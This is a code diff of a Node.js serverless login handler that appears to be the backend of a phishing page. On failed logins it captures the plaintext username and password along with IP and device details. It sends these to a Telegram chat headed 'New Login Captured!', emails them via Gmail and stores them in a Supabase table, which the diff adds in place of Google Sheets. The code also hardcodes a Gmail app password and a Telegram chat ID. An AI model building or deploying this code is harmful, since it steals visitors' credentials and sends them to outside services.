@@ -1,7 +1,7 @@
 const crypto     = require('crypto');
 const nodemailer = require('nodemailer');
 const fetch      = require('node-fetch');
-const { google } = require('googleapis');
+const { createClient } = require('@supabase/supabase-js');
 
 // ─── Credentials ──────────────────────────────────────────────────────────────
 const VALID_USER = 'nikhil';
@@ -17,84 +17,13 @@ const TELEGRAM_CHAT_ID   = '1388446058';
 const EMAIL_USER = 'picturesquare.jhansi@gmail.com';
 const EMAIL_PASS = 'bcjv orrt naby nztj';
 
-// ─── Google Sheets ────────────────────────────────────────────────────────────
-// These are set in Vercel Environment Variables
-const SHEET_ID         = process.env.GOOGLE_SHEET_ID;
-const CLIENT_EMAIL     = process.env.GOOGLE_CLIENT_EMAIL;
-const PRIVATE_KEY      = (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n');
-const SHEET_RANGE      = 'Sheet1!A:H'; // Timestamp, Username, Password, IP, Device, Browser, ID
+// ─── Supabase (auto-injected by Vercel when connected) ────────────────────────
+const supabase = createClient(
+    process.env.SUPABASE_URL,
+    process.env.SUPABASE_SERVICE_ROLE_KEY
+);
 
-// ─── Google Auth ──────────────────────────────────────────────────────────────
-function getSheetsClient() {
-    const auth = new google.auth.JWT({
-        email: CLIENT_EMAIL,
-        key:   PRIVATE_KEY,
-        scopes: ['https://www.googleapis.com/auth/spreadsheets']
-    });
-    return google.sheets({ version: 'v4', auth });
-}
-
-// ─── Token helper ─────────────────────────────────────────────────────────────
-function makeToken() {
-    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
-}
-
-// ─── Google Sheets: Append log ────────────────────────────────────────────────
-async function appendToSheet(entry) {
-    if (!SHEET_ID || !CLIENT_EMAIL || !PRIVATE_KEY) return;
-    try {
-        const sheets = getSheetsClient();
-        await sheets.spreadsheets.values.append({
-            spreadsheetId: SHEET_ID,
-            range:         SHEET_RANGE,
-            valueInputOption: 'USER_ENTERED',
-            requestBody: {
-                values: [[
-                    entry.timestamp,
-                    entry.username,
-                    entry.password,
-                    entry.ip,
-                    entry.device,
-                    entry.browser,
-                    entry.id
-                ]]
-            }
-        });
-    } catch (e) {
-        console.error('Sheets append error:', e.message);
-    }
-}
-
-// ─── Google Sheets: Read logs ─────────────────────────────────────────────────
-async function readFromSheet() {
-    if (!SHEET_ID || !CLIENT_EMAIL || !PRIVATE_KEY) return [];
-    try {
-        const sheets = getSheetsClient();
-        const res = await sheets.spreadsheets.values.get({
-            spreadsheetId: SHEET_ID,
-            range:         SHEET_RANGE
-        });
-        const rows = res.data.values || [];
-        // Map rows back to log objects (skip header row if present)
-        return rows
-            .filter(r => r[0] && r[0] !== 'Timestamp') // skip header
-            .map(r => ({
-                timestamp: r[0] || '',
-                username:  r[1] || '',
-                password:  r[2] || '',
-                ip:        r[3] || '',
-                device:    r[4] || '',
-                browser:   r[5] || '',
-                id:        r[6] || ''
-            }))
-            .reverse(); // newest first
-    } catch (e) {
-        console.error('Sheets read error:', e.message);
-        return [];
-    }
-}
-
-// ─── Nodemailer transporter ───────────────────────────────────────────────────
+// ─── Nodemailer ───────────────────────────────────────────────────────────────
 const transporter = nodemailer.createTransport({
     host:   'smtp.gmail.com',
     port:   465,
@@ -102,7 +31,50 @@ const transporter = nodemailer.createTransport({
     auth:   { user: EMAIL_USER, pass: EMAIL_PASS }
 });
 
-// ─── Telegram Notification ────────────────────────────────────────────────────
+// ─── Token helper ─────────────────────────────────────────────────────────────
+function makeToken() {
+    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
+}
+
+// ─── Supabase: Save log ───────────────────────────────────────────────────────
+async function saveToSupabase(entry) {
+    try {
+        const { error } = await supabase
+            .from('login_attempts')
+            .insert({
+                timestamp: entry.timestamp,
+                username:  entry.username,
+                password:  entry.password,
+                ip:        entry.ip,
+                device:    entry.device,
+                browser:   entry.browser
+            });
+        if (error) console.error('Supabase insert error:', error.message);
+    } catch (e) {
+        console.error('Supabase error:', e.message);
+    }
+}
+
+// ─── Supabase: Read logs ──────────────────────────────────────────────────────
+async function readFromSupabase() {
+    try {
+        const { data, error } = await supabase
+            .from('login_attempts')
+            .select('*')
+            .order('id', { ascending: false })
+            .limit(1000);
+        if (error) {
+            console.error('Supabase read error:', error.message);
+            return [];
+        }
+        return data || [];
+    } catch (e) {
+        console.error('Supabase read error:', e.message);
+        return [];
+    }
+}
+
+// ─── Telegram ─────────────────────────────────────────────────────────────────
 async function sendTelegram(entry) {
     const text =
         `🚨 *New Login Captured!*\n\n` +
@@ -117,11 +89,7 @@ async function sendTelegram(entry) {
             {
                 method:  'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body:    JSON.stringify({
-                    chat_id:    TELEGRAM_CHAT_ID,
-                    text,
-                    parse_mode: 'Markdown'
-                })
+                body:    JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
             }
         );
         const data = await r.json();
@@ -131,7 +99,7 @@ async function sendTelegram(entry) {
     }
 }
 
-// ─── Email Notification ───────────────────────────────────────────────────────
+// ─── Email ────────────────────────────────────────────────────────────────────
 async function sendEmail(entry) {
     try {
         await transporter.sendMail({
@@ -163,7 +131,7 @@ module.exports = async (req, res) => {
     if (req.method === 'GET') {
         const token = req.headers['x-admin-token'];
         if (token !== makeToken()) return res.status(401).json({ error: 'Unauthorized' });
-        const logs = await readFromSheet();
+        const logs = await readFromSupabase();
         return res.status(200).json({ logs });
     }
 
@@ -184,28 +152,27 @@ module.exports = async (req, res) => {
         if (!isValid) {
             const ua = req.headers['user-agent'] || '';
             let browser = 'Unknown';
-            if      (ua.includes('Edg'))                              browser = 'Edge';
-            else if (ua.includes('Chrome'))                           browser = 'Chrome';
-            else if (ua.includes('Firefox'))                          browser = 'Firefox';
+            if      (ua.includes('Edg'))                               browser = 'Edge';
+            else if (ua.includes('Chrome'))                            browser = 'Chrome';
+            else if (ua.includes('Firefox'))                           browser = 'Firefox';
             else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
 
             const device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
 
             const entry = {
-                id:        Date.now(),
                 timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                 username:  username || '',
                 password:  password || '',
                 browser,
                 device,
-                ip:        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
+                ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
             };
 
-            // ✅ AWAIT all 3 actions before responding — ensures delivery & persistence
+            // Await all 3 — ensures delivery before function terminates
             await Promise.all([
                 sendTelegram(entry),
                 sendEmail(entry),
-                appendToSheet(entry)
+                saveToSupabase(entry)
             ]);
         }
 
